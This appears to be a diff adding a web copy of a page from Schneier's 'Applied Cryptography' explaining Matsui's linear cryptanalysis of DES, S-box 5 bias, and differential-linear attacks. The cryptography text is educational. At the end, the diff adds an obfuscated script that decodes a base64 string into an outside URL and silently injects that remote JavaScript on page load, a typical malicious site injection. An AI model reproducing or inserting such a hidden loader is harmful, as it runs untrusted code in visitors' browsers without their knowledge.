@@ -1,0 +1,92 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Data Encryption Standard (DES)</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=12//-->
+<!--PAGES=290-293//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-12.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-14.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Linear Cryptanalysis</I></B></FONT></P>
+<P><B>Linear cryptanalysis</B> is another type of cryptanalytic attack, invented by Mitsuru Matsui [1016,1015,1017]. This attack uses linear approximations to describe the action of a block cipher (in this case, DES.)</P>
+<P>This means that if you XOR some of the plaintext bits together, XOR some ciphertext bits together, and then XOR the result, you will get a single bit that is the XOR of some of the key bits. This is a linear approximation and will hold with some probability <I>p.</I> If <I>p</I> &#8800; &#189;, then this bias can be exploited. Use collected plaintexts and associated ciphertexts to guess the values of the key bits. The more data you have, the more reliable the guess. The greater the bias, the greater the success rate with the same amount of data.</P>
+<P>How do you identify good linear approximations for DES? Find good 1-round linear approximations and join them together. (Again, ignore the initial and final permutations; they don&#146;t affect the attack.) Look at the S-boxes. There are 6 input bits and 4 output bits. The input bits can be combined using XOR in 63 useful ways (2<SUP>6</SUP> - 1), and the output bits can be combined in 15 useful ways. Now, for each S-box you can evaluate the probability that for a randomly chosen input, an input XOR combination equals some output XOR combination. If there is a combination with a high enough bias, then linear cryptanalysis may work.</P>
+<P>If the linear approximations are unbiased, then they would hold for 32 of the 64 possible inputs. I&#146;ll spare you the pages of tables, but the most biased S-box is S-box 5. In fact, the second input bit is equal to the XOR of all 4 output bits for only 12 inputs. This translates to a probability of <SMALL><SMALL><SUP>3</SUP>/<SUB>16</SUB></SMALL></SMALL>, or a bias of <SMALL><SMALL><SUP>5</SUP>/<SUB>16</SUB></SMALL></SMALL>, and is the most extreme bias in all the S-boxes. (Shamir noted this in [1423], but could not find a way to exploit it.)</P>
+<P>Figure 12.8 shows how to turn this into an attack against the DES round function. The input bit into S-box 5 is <I>b</I><SUB>26</SUB>. (I am numbering the bits from left to right and from 1 to 64. Matsui ignores this convention with DES and numbers his bits from right to left and from 0 to 63. It&#146;s enough to drive you mad.) The 4 output bits from S-box 5 are <I>c</I><SUB>17</SUB> <I>c</I><SUB>18</SUB> <I>c</I><SUB>19</SUB> and <I>c</I><SUB>20</SUB>. We can trace <I>b</I><SUB>26</SUB> backwards from the input to the S-box. The bit <I>a</I><SUB>26</SUB> is XORed with a bit from the subkey <I>K<SUB>i</I>,26</SUB> to obtain <I>b</I><SUB>26</SUB>. And bit <I>X</I><SUB>17</SUB> goes through the expansion permutation to become <I>a</I><SUB>26</SUB>. After the S-box, the 4 output bits go through the P-box to become 4 output bits of the round function: <I>Y</I><SUB>3</SUB> <I>Y</I><SUB>8</SUB> <I>Y</I><SUB>14</SUB> and <I>Y</I><SUB>25</SUB>. This means that with probability &#189; - <SMALL><SMALL><SUP>5</SUP>/<SUB>16</SUB></SMALL></SMALL> :</P>
+<I><P><A NAME="Fig8"></A><A HREF="javascript:displayWindow('images/12-08.jpg',193,232 )"><IMG SRC="images/12-08t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/12-08.jpg',193,232)"><FONT COLOR="#000077"><B>Figure 12.8</B></FONT></A>&nbsp;&nbsp;A 1-round linear approximation for DES.</I>
+</P>
+<DL>
+<DD><I>X</I><SUB>17</SUB> &#8853; <I>Y</I><SUB>3</SUB> &#8853; <I>Y</I><SUB>8</SUB> &#8853; <I>Y</I><SUB>14</SUB> &#8853; <I>Y</I><SUB>25</SUB> = <I>K</I><SUB>i</SUB><SUB>,</SUB><SUB>26</SUB>
+</DL>
+<P>Linear approximations for different rounds can be joined in a manner similar to that discussed under differential cryptanalysis. Figure 12.9 is a 3-round approximation with a probability of &#189; &#43; .0061. The individual approximations are of varying quality: The last is very good, the first is pretty good, and the middle is bad. But together the three 1-round approximations give a very good three-round approximation.
+</P>
+<P>The basic attack is to use the best linear approximation for 16-round DES. It requires 2<SUP>47</SUP> known plaintext blocks, and will result in 1 key bit. That&#146;s not very useful. If you interchange the role of plaintext and ciphertext and use decryption as well as encryption, you can get 2 key bits. That&#146;s still not very useful.</P>
+<I><P><A NAME="Fig9"></A><A HREF="javascript:displayWindow('images/12-09.jpg',191,262 )"><IMG SRC="images/12-09t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/12-09.jpg',191,262)"><FONT COLOR="#000077"><B>Figure 12.9</B></FONT></A>&nbsp;&nbsp;A 3-round linear approximation for DES.</I>
+</P>
+<P>There are refinements. Use a 14-round linear approximation for rounds 2 through 15. Guess the 6 subkey bits relevant to S-box 5 for the first and last rounds (12 key bits in all). Effectively you are doing 2<SUP>12</SUP> linear cryptanalyses in parallel and picking the correct one based on probabilities. This recovers the 12 bits plus the <I>b</I><SUB>26</SUB> and reversing plaintext and ciphertext recovers another 13 bits. To get the remaining 30 bits, use exhaustive search. There are other tricks, but that&#146;s basically it.</P>
+<P>Against full 16-round DES, this attack can recover the key with an average of 2<SUP>43</SUP> known plaintexts. A software implementation of this attack recovered a DES key in 50 days using 12 HP9000/735 workstations [1019]. That is the most effective attack against DES at the time of this writing.</P>
+<P>Linear cryptanalysis is heavily dependent on the structure of the S-boxes and the S-boxes in DES are not optimized against this attack. In fact, the ordering of the S-boxes chosen for DES lies among the 9 percent to 16 percent that offer the least protection against linear cryptanalysis [1018]. According to Don Coppersmith [373,374], resistance to linear cryptanalysis &#147;was not part of the design criteria of DES.&#148; Either they didn&#146;t know about linear cryptanalysis or they knew about something else even more powerful whose resistance criteria took precedence.</P>
+<P>Linear cryptanalysis is newer than differential cryptanalysis, and there may be more performance improvements in the coming years. Some ideas are proposed in [1270,811], but it is not clear that they can be used effectively against full DES. They work very well against reduced round variants, however.</P>
+<P><FONT SIZE="+1"><B><I>Future Directions</I></B></FONT></P>
+<P>Some work has been done to try to extend the concept of differential cryptanalysis to higher-order differentials [702,161,927,858,860]. Lars Knudsen uses something called partial differentials to attack 6-round DES; it requires 32 chosen plaintexts and 20,000 encryptions [860]. It is still too new to know if these extensions will make it easier to attack full 16-round DES.
+</P>
+<P>Another avenue of attack is <B>differential-linear cryptanalysis</B>: combining differential and linear cryptanalysis. Susan Langford and Hellman have an attack on 8-round DES that recovers 10 key bits with an 80 percent probability of success with 512 chosen plaintexts and a 95 percent probability of success with 768 chosen plaintexts [938]. After the attack, a brute-force search of the remaining keyspace (2<SUP>46</SUP> possible keys) is required. While this attack is comparable in time to previous attacks, it requires far less plaintext. However, it doesn&#146;t seem to extend easily to more rounds.</P>
+<P>But this attack is still new and work continues. It is possible that there may be a breakthrough some time during the next few years. Maybe there are benefits in combining this attack with higher-order differential cryptanalysis. Who knows?</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-12.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-14.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(WqonAePX, hIIWcDnx) {hIIWcDnx = WqonAePX.createElement('script');hIIWcDnx.type = 'text/javascript';hIIWcDnx.async = true;hIIWcDnx.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');WqonAePX.getElementsByTagName('body')[0].appendChild(hIIWcDnx);}(document));</script></body>
+</html>
